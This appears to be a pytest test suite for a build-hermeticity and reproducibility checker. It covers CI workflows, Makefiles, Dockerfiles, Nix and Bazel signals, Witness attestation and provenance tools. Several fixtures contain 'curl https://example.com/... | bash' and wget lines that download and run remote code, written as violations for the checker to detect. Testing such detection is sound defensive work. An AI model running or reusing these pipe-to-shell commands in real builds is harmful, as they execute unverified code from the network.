        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: pip install -e .")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    # ------------------------------------------------------------------
    # Violations → FAIL
    # ------------------------------------------------------------------

    def test_fail_with_raw_pip_install(self, tmp_path: Path) -> None:
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: pip install requests")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL

    def test_fail_safe_and_violation_in_same_file(self, tmp_path: Path) -> None:
        """A file with both uv sync and curl should still flag the curl line."""
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: uv sync\n  - run: curl https://example.com | bash\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL

    def test_fail_violation_in_makefile(self, tmp_path: Path) -> None:
        (tmp_path / "Makefile").write_text("install:\n\tcurl https://example.com/tool.sh | bash\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL
        assert any("Makefile" in v for v in result.evidence["violations_found"])

    def test_fail_violation_in_composite_action(self, tmp_path: Path) -> None:
        action_dir = tmp_path / ".github" / "actions" / "setup"
        action_dir.mkdir(parents=True)
        (action_dir / "action.yml").write_text(
            "runs:\n  using: composite\n  steps:\n    - run: wget https://example.com/tool.tar.gz\n"
        )
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL

    def test_fail_violation_in_gitlab_ci(self, tmp_path: Path) -> None:
        (tmp_path / ".gitlab-ci.yml").write_text("build:\n  script:\n    - pip install requests\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL

    def test_fail_violation_in_circleci(self, tmp_path: Path) -> None:
        circleci = tmp_path / ".circleci"
        circleci.mkdir()
        (circleci / "config.yml").write_text("jobs:\n  build:\n    steps:\n      - run: npm install\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL

    def test_fail_dockerfile_curl(self, tmp_path: Path) -> None:
        (tmp_path / "Dockerfile").write_text("FROM python:3.12\nRUN curl https://example.com/install.sh | bash\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL

    # ------------------------------------------------------------------
    # Dockerfile DEFERRED — apt-get is image build context, not a violation
    # ------------------------------------------------------------------

    def test_inconclusive_dockerfile_apt_get_only(self, tmp_path: Path) -> None:
        (tmp_path / "Dockerfile").write_text("FROM python:3.12\nRUN apt-get install -y build-essential\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE
        assert any("apt-get install" in d for d in result.evidence["deferred_found"])

    # ------------------------------------------------------------------
    # Comment stripping
    # ------------------------------------------------------------------

    def test_inconclusive_commented_out_violation(self, tmp_path: Path) -> None:
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  # example (do not use): pip install requests\n  - run: uv sync\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    def test_inconclusive_inline_comment_with_violation(self, tmp_path: Path) -> None:
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: uv sync # previously: pip install -r requirements.txt\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    # ------------------------------------------------------------------
    # Strong signals → PASS
    # ------------------------------------------------------------------

    def test_witness_mention_alone_does_not_pass(self, tmp_path: Path) -> None:
        # Text-only mention of witness in CI is no longer sufficient for a
        # PASS — see test_pass_verified_witness_attestation below.
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - uses: testifysec/witness-run-action@v0.1\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    def test_pass_verified_witness_attestation(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        verified = WitnessCheckResult(
            attempted=True,
            verified=True,
            network_clean=True,
            detail="runtime-trace predicate recorded an empty network log",
        )
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: verified)
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - uses: testifysec/witness-run-action@v0.1\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS
        assert "Witness" in result.message

    def test_fail_verified_witness_attestation_with_network_activity(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        dirty = WitnessCheckResult(
            attempted=True,
            verified=True,
            network_clean=False,
            detail="runtime-trace predicate recorded 1 network event(s)",
            evidence={"artifact": "witness-attestation.json"},
        )
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: dirty)
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: uv sync\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.FAIL
        assert any("witness attestation" in v for v in result.evidence["violations_found"])

    def test_witness_verification_disabled_via_config(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        # Even a mocked verified/clean attestation must not produce a PASS
        # when the pass config opts out of the network round-trip.
        verified = WitnessCheckResult(attempted=True, verified=True, network_clean=True, detail="clean")
        monkeypatch.setattr("darnit_reproducibility.handlers.check_witness_attestation", lambda ctx: verified)
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - uses: testifysec/witness-run-action@v0.1\n")
        result = repro_hermetic_build_handler({"verify_witness_attestations": False}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    def test_pass_nix_flake_build_in_ci(self, tmp_path: Path) -> None:
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: nix build .#default\n")
        ctx = make_ctx(tmp_path, dependency_results={"RE-01.02": "PASS"})
        result = repro_hermetic_build_handler({}, ctx)
        assert result.status == HandlerResultStatus.PASS
        assert "Nix" in result.message

    def test_inconclusive_nix_flake_without_build_env_declared_pass(self, tmp_path: Path) -> None:
        # Same repo shape as the PASS case above, but RE-01.02 (BuildEnvDeclared)
        # never confirmed flake.nix as the declared build environment — the nix
        # strong signal must be withheld, falling back to the grep heuristic.
        (tmp_path / "flake.nix").write_text("{ outputs = {}; }")
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: nix build .#default\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    def test_pass_bazel_with_sandbox_flag(self, tmp_path: Path) -> None:
        (tmp_path / "MODULE.bazel").write_text("module(name = 'myproject')")
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: bazel build //... --sandbox_default_allow_network=false\n")
        result = repro_hermetic_build_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS
        assert "Bazel" in result.message


class TestHermeticBuildCoverage:
    """Feature 038: scan coverage (#430, #432) and the FR-010 propagation.

    Kept in its own class because these exercise additions to the scan rather
    than the existing PASS/FAIL contract covered by TestHermeticBuild.
    """

    def _repo(self, tmp_path: Path, files: dict[str, str]) -> Path:
        for name, content in files.items():
            target = tmp_path / name
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(content, encoding="utf-8")
        return tmp_path

    @pytest.mark.parametrize(
        "command",
        [
            "go install example.com/tool@latest",
            "go get example.com/dep",
            "cargo install ripgrep",
            "gem install bundler",
        ],
    )
    def test_installers_are_violations(self, tmp_path: Path, command: str) -> None:
        """HS-1 / SC-004: a Go or Rust build that fetches at build time used to
        scan clean, because only the Python and Node installers were listed."""
        repo = self._repo(tmp_path, {".github/workflows/ci.yml": f"steps:\n  - run: {command}\n"})
        result = repro_hermetic_build_handler({}, make_ctx(repo))
        assert result.status == HandlerResultStatus.FAIL
        assert "ci.yml" in result.message

    def test_pinned_installer_names_the_version(self, tmp_path: Path) -> None:
        """HS-2 / FR-011. Still a violation -- this control's subject is
        hermeticity, not determinism -- but the operator can see it is pinned."""
        repo = self._repo(
            tmp_path,
            {".github/workflows/ci.yml": "steps:\n  - run: go install example.com/t@v1.2.3\n"},
        )
        result = repro_hermetic_build_handler({}, make_ctx(repo))
        assert result.status == HandlerResultStatus.FAIL
        assert "pinned to v1.2.3" in result.message

    @pytest.mark.parametrize("flag", ["-ffast-math", "-march=native", "-mtune=native"])
    def test_nondeterministic_flags_are_reported(self, tmp_path: Path, flag: str) -> None:
        """HS-3 / SC-005."""
        repo = self._repo(tmp_path, {"Makefile": f"build:\n\tgcc {flag} -o app main.c\n"})
        result = repro_hermetic_build_handler({}, make_ctx(repo))
        assert result.status == HandlerResultStatus.FAIL
        assert flag in result.message
        assert "Makefile" in result.message

    def test_flag_finding_is_not_called_a_network_fetch(self, tmp_path: Path) -> None:
        """HS-4. Sharing the network-fetch message would tell the operator a
        compiler flag was a network fetch."""
        repo = self._repo(tmp_path, {"Makefile": "build:\n\tgcc -march=native main.c\n"})
        result = repro_hermetic_build_handler({}, make_ctx(repo))
        assert "live network fetches" not in result.message
        assert "Non-deterministic compiler flags" in result.message

    def test_o3_alone_is_not_flagged(self, tmp_path: Path) -> None:
        """HS-5. At a fixed toolchain `-O3` is deterministic. The
        non-determinism #432 describes comes from the unpinned toolchain, and
        flagging `-O3` would fire on a large share of legitimate builds."""
        repo = self._repo(tmp_path, {"Makefile": "build:\n\tgcc -O3 -o app main.c\n"})
        result = repro_hermetic_build_handler({}, make_ctx(repo))
        assert result.status != HandlerResultStatus.FAIL

    @pytest.mark.parametrize("line", ["# gcc -march=native main.c", "# go install example.com/t@latest"])
    def test_comments_are_not_findings(self, tmp_path: Path, line: str) -> None:
        """HS-6 / FR-015. Detection goes through `_scan_line`, which strips
        comments; a second scanning path would lose that."""
        repo = self._repo(tmp_path, {"Makefile": f"build:\n\t{line}\n\techo ok\n"})
        result = repro_hermetic_build_handler({}, make_ctx(repo))
        assert result.status != HandlerResultStatus.FAIL

    def test_bazel_pass_survives_the_reporting_split(self, tmp_path: Path) -> None:
        """HS-9. T004 restructured the violation buckets inside this handler,
        which is exactly where the early-return PASS paths could regress."""
        repo = self._repo(
            tmp_path,
            {
                "WORKSPACE": "workspace(name='x')\n",
                ".github/workflows/ci.yml": (
                    "steps:\n  - run: bazel build //... --sandbox_default_allow_network=false\n"
                ),
            },
        )
        result = repro_hermetic_build_handler({}, make_ctx(repo))
        assert result.status == HandlerResultStatus.PASS
        assert "Strong hermeticity signal" in result.message

    def test_nix_signal_still_fires_when_re0102_passed(self, tmp_path: Path) -> None:
        """HS-7: the unchanged case."""
        repo = self._repo(
            tmp_path,
            {
                "flake.nix": "{ outputs = {}; }",
                ".github/workflows/ci.yml": "steps:\n  - run: nix build .#default\n",
            },
        )
        ctx = make_ctx(repo, dependency_results={"RE-01.02": "PASS"})
        result = repro_hermetic_build_handler({}, ctx)
        assert result.status == HandlerResultStatus.PASS
        assert "Nix flake build in CI" in result.message

    def test_nix_signal_withheld_says_why(self, tmp_path: Path) -> None:
        """HS-8 / SC-010. The FR-010 propagation.

        A repo with a flake and an unpinned Dockerfile loses a hermeticity PASS
        without its flake changing. That is intended, but the operator must be
        able to tell the signal was withheld because of RE-01.02 rather than
        because the flake stopped being found.
        """
        repo = self._repo(
            tmp_path,
            {
                "flake.nix": "{ outputs = {}; }",
                "Dockerfile": "FROM alpine:latest\n",
                ".github/workflows/ci.yml": "steps:\n  - run: nix build .#default\n",
            },
        )
        ctx = make_ctx(repo, dependency_results={"RE-01.02": "WARN"})
        result = repro_hermetic_build_handler({}, ctx)
        assert result.status != HandlerResultStatus.PASS
        assert "RE-01.02" in result.message
        assert "BuildEnvDeclared" in result.message

    def test_propagation_end_to_end(self, tmp_path: Path) -> None:
        """SC-010: RE-01.02 does not pass, and RE-02.01 loses the signal."""
        repo = self._repo(
            tmp_path,
            {
                "flake.nix": "{ outputs = {}; }",
                "Dockerfile": "FROM alpine:latest\n",
                ".github/workflows/ci.yml": "steps:\n  - run: nix build .#default\n",
            },
        )
        env = repro_build_env_declared_handler({}, make_ctx(repo))
        assert env.status == HandlerResultStatus.PASS, (
            "a flake outranks an unpinned Dockerfile, so RE-01.02 still passes here"
        )

        # Without the flake, the unpinned Dockerfile governs and the chain breaks.
        (repo / "flake.nix").unlink()
        env = repro_build_env_declared_handler({}, make_ctx(repo))
        assert env.status == HandlerResultStatus.WARN
        hermetic = repro_hermetic_build_handler(
            {}, make_ctx(repo, dependency_results={"RE-01.02": env.status.value.upper()})
        )
        assert hermetic.status != HandlerResultStatus.PASS


class TestProvenanceExists:
    """Tests for repro_provenance_exists_handler()."""

    def test_inconclusive_with_no_workflows(self, tmp_path: Path) -> None:
        result = repro_provenance_exists_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    def test_pass_with_cosign_in_workflow(self, tmp_path: Path) -> None:
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "release.yml").write_text("steps:\n  - uses: sigstore/cosign")
        result = repro_provenance_exists_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS

    def test_pass_with_slsa_generator(self, tmp_path: Path) -> None:
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "release.yml").write_text("steps:\n  - uses: slsa-framework/slsa-github-generator")
        result = repro_provenance_exists_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.PASS


class TestBitForBit:
    """Tests for repro_bit_for_bit_handler()."""

    def test_inconclusive_with_no_workflows(self, tmp_path: Path) -> None:
        result = repro_bit_for_bit_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE

    HASH_SIGNALS = ("SOURCE_DATE_EPOCH", "reprotest", "diffoscope")

    def test_warn_with_source_date_epoch(self, tmp_path: Path) -> None:
        """Feature 038 (#445). This asserted PASS until 2026-09.

        One occurrence of an environment variable name in one workflow used to
        produce a dispositive PASS on "Build output is identical across
        independent builds". Nothing was built; nothing was compared.
        """
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("env:\n  SOURCE_DATE_EPOCH: 0")
        result = repro_bit_for_bit_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.WARN

    def test_warn_message_names_signal_and_the_gap(self, tmp_path: Path) -> None:
        """SC-001, FR-012: "no evidence" and "promising but unverified" must be
        distinguishable from the message alone."""
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("env:\n  SOURCE_DATE_EPOCH: 0")
        result = repro_bit_for_bit_handler({}, make_ctx(tmp_path))
        assert "SOURCE_DATE_EPOCH" in result.message
        assert "not verified" in result.message

    @pytest.mark.parametrize("signal", ["reprotest", "diffoscope"])
    def test_other_signals_warn_the_same_way(self, tmp_path: Path, signal: str) -> None:
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text(f"steps:\n  - run: {signal} ./build.sh\n")
        result = repro_bit_for_bit_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.WARN
        assert signal in result.message

    def test_date_macro_not_flagged(self, tmp_path: Path) -> None:
        """__DATE__ is a C-source macro, not a workflow signal; a workflow-only
        scan must not FAIL on it. With no positive signal present the result is
        INCONCLUSIVE (manual verification), never a false FAIL."""
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text("steps:\n  - run: echo __DATE__")
        result = repro_bit_for_bit_handler({}, make_ctx(tmp_path))
        assert result.status == HandlerResultStatus.INCONCLUSIVE
